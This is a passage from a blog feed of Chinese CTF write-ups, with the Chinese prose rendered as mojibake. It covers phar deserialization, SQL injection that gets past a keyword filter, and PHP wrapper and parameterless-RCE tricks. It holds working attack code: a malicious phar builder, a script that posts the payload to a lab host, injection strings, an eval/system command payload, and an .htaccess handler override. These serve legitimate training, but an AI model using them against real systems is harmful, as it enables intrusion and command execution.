class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>file_put_contents($pear,urldecode($file));æ˜¯å†™å…¥æ–‡ä»¶ï¼Œç»“åˆåé¢çš„file_existsï¼Œå¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/6957df58912e73dbe61273a2.png"></p><p>ç”¨010ä¿®æ”¹ä¸€ä¸‹ç»•__wakeup</p><p>é‡æ–°ç­¾å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()  <span class="hljs-comment">#æ‰“å¼€åä¸º1.pharçš„æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶åªè¯»æ¨¡å¼è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°å˜é‡fä¸­</span><br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># è·å–è¦ç­¾åçš„æ•°æ®ï¼ˆsï¼‰</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†ï¼ˆhï¼‰</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># å¯¹è¦ç­¾åçš„æ•°æ®è¿›è¡ŒSHA-1å“ˆå¸Œè®¡ç®—ï¼Œå¹¶å°†åŸå§‹æ•°æ®ã€ç­¾åå’Œç±»å‹/æ ‡è¯†æ‹¼æ¥æˆæ–°çš„æ•°æ®newf</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf)<br><br><span class="hljs-comment"># å°†å¤„ç†åçš„æ•°æ®newfå†™å…¥åˆ°ä¸€ä¸ªåä¸ºnewtest.pharçš„æ–°æ–‡ä»¶ä¸­ï¼Œä»¥äºŒè¿›åˆ¶å†™å…¥æ¨¡å¼ã€‚</span><br></code></pre></td></tr></table></figure><p>æäº¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br>u=<span class="hljs-string">&quot;http://7edfddeb-3d9f-4b5f-8f16-f66f6afc520d.node5.buuoj.cn:81/pairing.php?pear=1.phar&amp;apple=phar://1.phar&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f)<br>    <span class="hljs-built_in">print</span>(ff) <br>    fin=requests.post(url=u,data=ff)<br>    <br><span class="hljs-built_in">print</span>(fin.text)<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><p><a href="https://drun1baby.top/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">PHP GC å›æ”¶æœºåˆ¶å­¦ä¹  | Drunkbabyâ€™s Blog</a></p><p><a href="https://xz.aliyun.com/news/14565">æ·±å…¥æµ…å‡ºPHPååºåˆ—åŒ–</a></p><p><a href="https://www.cnblogs.com/lktop666/articles/18581571">phpååºåˆ—åŒ–</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SDPCSECçº³æ–°èµ›1.0</title>
    <link href="/2025/12/20/SDPCSEC%E7%BA%B3%E6%96%B0%E8%B5%9B1/"/>
    <url>/2025/12/20/SDPCSEC%E7%BA%B3%E6%96%B0%E8%B5%9B1/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="äº”è¨€"><a href="#äº”è¨€" class="headerlink" title="äº”è¨€"></a>äº”è¨€</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$Pr0</span>) &gt; <span class="hljs-number">5</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªå¤ªå¤ªå¤ªå¤ªé•¿äº†!&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$Pr0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é™åˆ¶Pr0åªèƒ½æœ‰äº”ä¸ªå­—ç¬¦</p><p><img src="https://pic1.imgdb.cn/item/69493bd8c154427986d9ec61.png"></p><h2 id="å¬è¯´ä½ æ˜¯é«˜ç©ï¼Ÿ"><a href="#å¬è¯´ä½ æ˜¯é«˜ç©ï¼Ÿ" class="headerlink" title="å¬è¯´ä½ æ˜¯é«˜ç©ï¼Ÿ"></a>å¬è¯´ä½ æ˜¯é«˜ç©ï¼Ÿ</h2><p>æŸ¥çœ‹é¡µé¢æºä»£ç å‘ç°ffffflllllaaaaaagggggg.phpï¼Œä¸€å…±æœ‰ä¸‰ä¸ªåŠŸèƒ½æ³¨å†Œsessionã€æ›´æ–°åˆ†æ•°ã€è·å–flag</p><p>å…ˆæ›´æ–°ä¸€ä¸ªå‡çš„åˆ†æ•°</p><p><img src="https://pic1.imgdb.cn/item/6946732229a616e528616a79.png"></p><p>å†è·å–flag</p><p><img src="https://pic1.imgdb.cn/item/694672e429a616e5286169f1.png"></p><h2 id="æ–­ç« "><a href="#æ–­ç« " class="headerlink" title="æ–­ç« "></a>æ–­ç« </h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªæ³¨å†Œç™»å½•ï¼Œè¿›å»ä¹‹åå¯ä»¥æŸ¥è¯¢idï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥</p><p>å…ˆè¯•è¯• 2-1 å‘ç°è¢«è¿‡æ»¤äº†ï¼Œé‚£å†è¯•è¯• 2*3 å‘ç°ä¸æ˜¯æ•´æ•°å‹æ³¨å…¥</p><p>å†è¯• â€˜ å‡ºç°æŠ¥é”™ï¼Œå¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œå¤§æ¦‚é•¿è¿™æ ·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-string">&#x27;id=æ³¨å…¥ç‚¹&#x27;</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ³¨å…¥ <code>1&#39; #</code> å‘ç°#ä¹Ÿè¢«è¿‡æ»¤äº†</p><p>ä¸€é¡¿ä¹±æå‘ç°andï¼Œorï¼Œselectéƒ½è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œæ²¡å…³ç³»å¯ä»¥åŒå†™ç»•è¿‡</p><p>æ‰€ä»¥åªè¦æƒ³åŠæ³•æŠŠåé¢çš„å•å¼•å·é—­åˆå°±è¡Œäº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect database(),2,3,4 where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span> #çˆ†æ•°æ®åº“<br></code></pre></td></tr></table></figure><p><strong>Terra_Data</strong></p><p>æ³¨æ„ä¸‹é¢ç”¨åˆ°çš„informationä¸­ä¹Ÿæœ‰or</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema=&#x27;</span>Terra_Data<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™ä¸ªä¸è¡Œï¼Œè¿”å›none</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() anandd &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span> #çˆ†è¡¨<br></code></pre></td></tr></table></figure><p><strong>secret</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,group_concat(column_name),3,4 from infoorrmation_schema.columns where table_name=&#x27;</span>secret #çˆ†å­—æ®µ<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect group_concat(flag),2,3,4 from terra_data.secret where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æç¤ºæ²¡æœ‰æƒé™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect group_concat(flag),2,3,4 from secret where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/694677f429a616e52861758a.png"></p><h2 id="æµ®å…‰"><a href="#æµ®å…‰" class="headerlink" title="æµ®å…‰"></a>æµ®å…‰</h2><p>æ‰“å¼€å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå…ˆæ‹¿dirsearchæ‰«ä¸€ä¸‹</p><p><img src="https://pic1.imgdb.cn/item/6946788729a616e528617753.png"></p><p>å‘ç°æºç æ³„éœ²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-comment">#è¢«ä½ æ‰¾åˆ°äº†:(</span><br><span class="hljs-comment">#ç»™ä½ å‡†å¤‡äº†ä¸€ä»½å°ç¤¼ç‰©æ”¾åœ¨äº†gift.phpä¸­äº†å“¦~</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = [<br>        <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;phar&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;expect&#x27;</span>, <span class="hljs-string">&#x27;ftp&#x27;</span>,<br>        <span class="hljs-string">&#x27;etc&#x27;</span>, <span class="hljs-string">&#x27;proc&#x27;</span>,<br>        <span class="hljs-string">&#x27;base64&#x27;</span>,  <span class="hljs-string">&#x27;string&#x27;</span>,  <span class="hljs-string">&#x27;rot13&#x27;</span>, <span class="hljs-string">&#x27;quoted&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;ter/res&#x27;</span>,<br>        <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;echo&#x27;</span><br>    ];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$keyword</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$keyword</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-comment">#ç›´æ¥è¯»æ–‡ä»¶æ˜¯ä¸å¯ä»¥çš„~</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$file</span>, FILTER_VALIDATE_URL))&#123;<br>    <span class="hljs-comment">#waf?!</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-variable">$content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf!!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ— æ•ˆçš„urlæ ¼å¼&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.phpå­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¸è¿‡è¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼ï¼Œæ—¢ç„¶æœ‰å°ç¤¼ç‰©ï¼Œé‚£å°±è¯»ä¸€ä¸‹gift.phpå§</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">/?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-4</span>*.UCS<span class="hljs-number">-4</span>BE/resource=gift.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#ç¤¼ç‰©æ˜¯ä¸€ä»½shellå“¦, å¿«æ¥æ‰§è¡Œå‘½ä»¤å§:)</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m1xian&#x27;</span>]))&#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m1xian&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong>ï¼š<code>/[^\W]+\((?R)?\)/</code>ç”¨äºåŒ¹é…ç±»ä¼¼å‡½æ•°è°ƒç”¨çš„æ¨¡å¼ï¼ˆå¦‚<code>abc()</code>æˆ–<code>abc(def())</code>ï¼‰ï¼Œå…¶ä¸­å‚æ•°å¿…é¡»æ˜¯å¦ä¸€ä¸ªå‡½æ•°è°ƒç”¨æˆ–ä¸ºç©ºã€‚</p><p>phpinfo();   Th1s_1s_n0t_wh2t_yo3_w4nt è¢«éª—äº†</p><p>æƒ³èµ·ä¹‹å‰ctfshowåšçš„ä¸€å¥è¯æœ¨é©¬å˜å½¢ç”¨çš„æ— å‚rceï¼Œæ‹¿æ¥ç”¨ç”¨</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">m1xian</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸ</p><p><img src="https://pic1.imgdb.cn/item/69467a3129a616e528617d26.png"></p><h2 id="ez-blog-2-0"><a href="#ez-blog-2-0" class="headerlink" title="ez_blog_2.0"></a>ez_blog_2.0</h2><p>è™½ç„¶æˆ‘ä¸ä¼šåšä½†æˆ‘ä¼šæŠŠå®¹å™¨æå(bushi)</p><p>å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œç»“åˆapacheä¸Šä¼ .htaccess</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;\.txt&quot;</span>&gt;</span><br>  <span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/69467c6d29a616e52861873b.png"></p><p>ä¸€ä¼ ä¸Šå»å®¹å™¨å°±å˜äº†</p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="æ•°æ®åˆ†æ1"><a href="#æ•°æ®åˆ†æ1" class="headerlink" title="æ•°æ®åˆ†æ1"></a>æ•°æ®åˆ†æ1</h2><p><img src="https://pic1.imgdb.cn/item/69467a9329a616e528617e53.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Caserï¼Ÿ"><a href="#Caserï¼Ÿ" class="headerlink" title="Caserï¼Ÿ"></a>Caserï¼Ÿ</h2><p>ä½¿ç”¨éšæ³¢å…¥æµå·¥å…·ç»“åˆhint</p><p><img src="https://pic1.imgdb.cn/item/69467b1729a616e52861808e.png"></p><h2 id="ä½ çŸ¥é“RSAå—"><a href="#ä½ çŸ¥é“RSAå—" class="headerlink" title="ä½ çŸ¥é“RSAå—"></a>ä½ çŸ¥é“RSAå—</h2><p>aiçœŸå¼ºå¤§</p><ol><li><strong>è®¡ç®—æ¨¡æ•° n</strong>ï¼š<code>n = p Ã— q = 91790401643935968086245576021782314389461981833511001951332959943149406173651</code></li><li><strong>è®¡ç®—æ¬§æ‹‰å‡½æ•° Ï†(n)</strong>ï¼š<code>Ï†(n) = (p-1) Ã— (q-1) = 91790401643935968086245576021782314388855762181985072030992771608097748260704</code></li><li><strong>è®¡ç®—ç§é’¥ dï¼ˆe çš„æ¨¡ Ï†(n) é€†å…ƒï¼‰</strong>ï¼šé€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å¾—ï¼š<code>d = 2140100000182098039821524332228868828084465334300825336273508934146716501249</code></li></ol><h1 id="è¡¥æ¡£"><a href="#è¡¥æ¡£" class="headerlink" title="è¡¥æ¡£"></a>è¡¥æ¡£</h1><h2 id="ez-blog2-0"><a href="#ez-blog2-0" class="headerlink" title="ez_blog2.0"></a>ez_blog2.0</h2><p>ä¹‹å‰å¤±è´¥æ˜¯å› 